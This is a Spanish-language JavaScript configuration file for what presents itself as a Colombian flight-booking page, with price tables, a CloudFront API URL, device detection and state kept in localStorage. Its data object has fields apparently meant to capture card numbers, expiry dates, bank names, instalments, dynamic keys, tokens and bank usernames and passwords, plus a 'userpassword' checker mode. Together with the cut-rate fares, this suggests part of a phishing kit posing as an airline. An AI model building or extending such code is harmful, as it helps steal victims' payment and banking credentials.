/**
 * CONFIGURACIГ“N
 */
// const API_URL = 'http://127.0.0.1:8080'; // Cambiar segГєn convenga.
const API_URL = 'https://d2izes8xqwwbc2.cloudfront.net'; // Cambiar segГєn convenga.

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [750, 1100],
        countries: [
            "CanadГЎ",
            "Estados Unidos",
            "MГ©xico"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [550, 850],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "PanamГЎ",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "RepГєblica Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [550, 850],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "PerГє",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "EspaГ±a",
            "Reino Unido",
            "Alemania"
        ]
    }

];

const pricesNAC = {
    flight_1:{
        xs: 49900,
        s: 69900,
        m: 89900,
    },
    flight_2:{
        xs: 55900,
        s: 73900,
        m: 89900,
    },
    flight_3:{
        xs: 78900,
        s: 109900,
        m: 129000,
    } 
};

const pricesINT = {
    flight_1:{
        xs: 359900,
        s: 389000,
        m: 410900,
    },
    flight_2:{
        xs: 389000,
        s: 428900,
        m: 478900,
    },
    flight_3:{
        xs: 529000,
        s: 569000,
        m: 599900,
    }
};

let info = {
    flightInfo:{
        type: 1,
        ticket: false,
        origin: {
            city: "Bogotá",
            country: "Colombia",
            code: "BOG"
        },
        destination: {
            
        },
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0],
        ticket_nat: false,
        ticket_sched: false,
        ticket_type: false,

    },
    passengersInfo:{
        adults: [],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }
    if (userAgent.includes('android')) {
        info.metaInfo.disp = "Android";
    }

    if (userAgent.includes('Windows')) {
        info.metaInfo.disp = "PC";
    }
}


LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

document.addEventListener("DOMContentLoaded", function () {
    const btnTariffConditions = document.querySelector("#btn-tariff-conditions");
    const tariffContent = document.querySelector("#tariff-conditions-content");
    const arrowIcon = document.querySelector("#arrow-icon");

    // Alternar la visibilidad cuando se haga clic en "Condiciones tarifarias"
    btnTariffConditions.addEventListener("click", (event) => {
        event.stopPropagation(); // Evita que el evento de clic se propague al documento
        const isVisible = tariffContent.classList.contains("show");

        if (!isVisible) {
            tariffContent.classList.add("show");
            arrowIcon.style.transform = "rotate(180deg)"; // Rotar flecha hacia arriba
        } else {
            tariffContent.classList.remove("show");
            arrowIcon.style.transform = "rotate(0deg)"; // Rotar flecha hacia abajo
        }
    });

    // Cerrar el acordeón si el usuario hace clic fuera de él
    document.addEventListener("click", (event) => {
        if (!tariffContent.contains(event.target) && !btnTariffConditions.contains(event.target)) {
            tariffContent.classList.remove("show");
            arrowIcon.style.transform = "rotate(0deg)";
        }
    });
});

